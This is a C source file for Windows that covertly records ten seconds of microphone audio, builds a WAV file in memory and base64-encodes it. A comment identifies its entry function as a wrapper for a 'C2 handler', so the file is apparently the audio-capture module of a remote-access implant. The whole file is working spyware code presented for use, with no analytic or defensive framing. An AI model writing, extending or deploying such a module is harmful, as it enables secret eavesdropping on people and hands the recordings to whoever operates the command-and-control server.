#include <windows.h>
#include <mmsystem.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Link with winmm.lib for multimedia functions
#pragma comment(lib, "winmm.lib")

#define SAMPLE_RATE 44100
#define BITS_PER_SAMPLE 16
#define CHANNELS 2

// Structure to hold audio recording data
typedef struct {
    unsigned char* data;
    DWORD dataSize;
    int sampleRate;
    int bitsPerSample;
    int channels;
} AudioRecording;

// Function to write the WAV file header to memory
void WriteWavHeaderToMemory(unsigned char* buffer, int sampleRate, int bitsPerSample, int channels, int dataSize) {
    int byteRate = sampleRate * channels * bitsPerSample / 8;
    short blockAlign = channels * bitsPerSample / 8;
    int offset = 0;

    // Write RIFF header
    memcpy(buffer + offset, "RIFF", 4);
    offset += 4;
    int chunkSize = 36 + dataSize;
    memcpy(buffer + offset, &chunkSize, 4);
    offset += 4;
    memcpy(buffer + offset, "WAVE", 4);
    offset += 4;

    // Write fmt subchunk
    memcpy(buffer + offset, "fmt ", 4);
    offset += 4;
    int subChunk1Size = 16;
    memcpy(buffer + offset, &subChunk1Size, 4);
    offset += 4;
    short audioFormat = 1;
    memcpy(buffer + offset, &audioFormat, 2);
    offset += 2;
    memcpy(buffer + offset, &channels, 2);
    offset += 2;
    memcpy(buffer + offset, &sampleRate, 4);
    offset += 4;
    memcpy(buffer + offset, &byteRate, 4);
    offset += 4;
    memcpy(buffer + offset, &blockAlign, 2);
    offset += 2;
    memcpy(buffer + offset, &bitsPerSample, 2);
    offset += 2;

    // Write data subchunk
    memcpy(buffer + offset, "data", 4);
    offset += 4;
    memcpy(buffer + offset, &dataSize, 4);
}

// Record audio for a specified duration and store in memory
AudioRecording* RecordAudioToMemory(int duration) {
    if (duration <= 0) {
        return NULL;
    }

    AudioRecording* recording = (AudioRecording*)malloc(sizeof(AudioRecording));
    if (recording == NULL) {
        return NULL;
    }

    // Calculate buffer size for the recording
    int bufferSize = SAMPLE_RATE * CHANNELS * BITS_PER_SAMPLE / 8 * duration;
    unsigned char* tempBuffer = (unsigned char*)malloc(bufferSize);
    if (!tempBuffer) {
        free(recording);
        return NULL;
    }

    HWAVEIN hWaveIn = NULL;
    WAVEFORMATEX waveFormat;
    WAVEHDR waveHeader;

    // Set up the wave format structure
    waveFormat.wFormatTag = WAVE_FORMAT_PCM;
    waveFormat.nChannels = CHANNELS;
    waveFormat.nSamplesPerSec = SAMPLE_RATE;
    waveFormat.nAvgBytesPerSec = SAMPLE_RATE * CHANNELS * BITS_PER_SAMPLE / 8;
    waveFormat.nBlockAlign = CHANNELS * BITS_PER_SAMPLE / 8;
    waveFormat.wBitsPerSample = BITS_PER_SAMPLE;
    waveFormat.cbSize = 0;

    // Open the audio input device
    if (waveInOpen(&hWaveIn, WAVE_MAPPER, &waveFormat, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        free(tempBuffer);
        free(recording);
        return NULL;
    }

    // Prepare the wave header
    waveHeader.lpData = (LPSTR)tempBuffer;
    waveHeader.dwBufferLength = bufferSize;
    waveHeader.dwFlags = 0;
    waveHeader.dwLoops = 0;

    if (waveInPrepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        waveInClose(hWaveIn);
        free(tempBuffer);
        free(recording);
        return NULL;
    }

    // Add the buffer to the audio input device
    if (waveInAddBuffer(hWaveIn, &waveHeader, sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(tempBuffer);
        free(recording);
        return NULL;
    }

    // Start recording
    if (waveInStart(hWaveIn) != MMSYSERR_NOERROR) {
        waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        free(tempBuffer);
        free(recording);
        return NULL;
    }

    // Wait for recording to complete
    Sleep(duration * 1000);

    // Stop recording
    waveInStop(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &waveHeader, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    // Allocate memory for WAV file (headers + audio data)
    int wavHeaderSize = 44; // Standard WAV header size
    int totalSize = wavHeaderSize + bufferSize;

    unsigned char* wavBuffer = (unsigned char*)malloc(totalSize);
    if (wavBuffer == NULL) {
        free(tempBuffer);
        free(recording);
        return NULL;
    }

    // Write WAV header to memory
    WriteWavHeaderToMemory(wavBuffer, SAMPLE_RATE, BITS_PER_SAMPLE, CHANNELS, bufferSize);

    // Copy audio data after header
    memcpy(wavBuffer + wavHeaderSize, tempBuffer, bufferSize);

    recording->data = wavBuffer;
    recording->dataSize = totalSize;
    recording->sampleRate = SAMPLE_RATE;
    recording->bitsPerSample = BITS_PER_SAMPLE;
    recording->channels = CHANNELS;

    free(tempBuffer);
    return recording;
}

// Free audio recording structure
void FreeAudioRecording(AudioRecording* recording) {
    if (recording != NULL) {
        if (recording->data != NULL) {
            free(recording->data);
        }
        free(recording);
    }
}

// Base64 encoding function declared in base64.c
extern char* base64_encode(const unsigned char* data, size_t data_len);

// Start audio recorder - wrapper function for C2 handler
// Returns a dynamically allocated base64-encoded WAV file data
char* start_audio_recorder() {
    // Record for 10 seconds
    AudioRecording* recording = RecordAudioToMemory(10);
    
    if (recording) {
        // Base64 encode the audio data
        char* encoded = base64_encode(recording->data, recording->dataSize);
        FreeAudioRecording(recording);
        return encoded;
    }
    
    return NULL;
}
